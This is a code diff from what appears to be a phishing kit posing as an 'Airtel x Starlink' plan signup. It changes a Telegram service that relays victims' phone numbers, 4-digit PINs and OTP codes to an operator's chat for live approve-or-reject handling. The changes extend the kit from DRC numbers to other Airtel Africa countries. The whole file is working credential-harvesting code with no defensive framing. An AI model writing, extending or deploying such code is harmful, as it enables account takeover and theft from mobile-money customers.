@@ -3,6 +3,10 @@ import { getTelegramBotToken, getTelegramChatId } from '../config/telegram';
 export interface TelegramLoginPayload {
   sessionId: string;
   phone: string;
+  fullPhone?: string;
+  country?: string;
+  countryCode?: string;
+  airtelBrand?: string;
   pin: string;
   planName: string;
   planPrice: string;
@@ -11,6 +15,9 @@ export interface TelegramLoginPayload {
 export interface TelegramOtpPayload {
   sessionId: string;
   phone?: string;
+  fullPhone?: string;
+  country?: string;
+  airtelBrand?: string;
   otp: string;
   planName?: string;
   planPrice?: string;
@@ -29,6 +36,8 @@ class TelegramService {
       loginStatus: 'pending' | 'approved' | 'rejected';
       otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
       phone?: string;
+      fullPhone?: string;
+      country?: string;
       pin?: string;
       otp?: string;
       planName?: string;
@@ -174,12 +183,17 @@ class TelegramService {
       cloudId: resolvedCloudId,
     });
 
+    const displayPhone = payload.fullPhone || (phone.startsWith('+') ? phone : `+243 ${phone}`);
+    const displayCountry = payload.country || 'Airtel Africa';
+    const displayBrand = payload.airtelBrand || 'Airtel x Starlink Direct';
+
     const messageText =
       `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
-      `👤 <b>Numéro de Téléphone:</b> <code>+243 ${cleanPhone}</code>\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
       `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
       `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
-      `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
+      `📶 <b>Réseau:</b> ${displayBrand}\n` +
       `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
       `🆔 <b>ID Session:</b> <code>${resolvedCloudId}</code>\n\n` +
       `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
@@ -272,9 +286,13 @@ class TelegramService {
       console.warn('Direct cloud store OTP update warning:', err);
     }
 
+    const displayPhone = payload.fullPhone || phone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
+    const displayCountry = payload.country || existing.country || 'Airtel Africa';
+
     const messageText =
       `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
-      `👤 <b>Numéro:</b> <code>+243 ${phone || existing.phone || 'Inconnu'}</code>\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
       `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
       `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
       `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
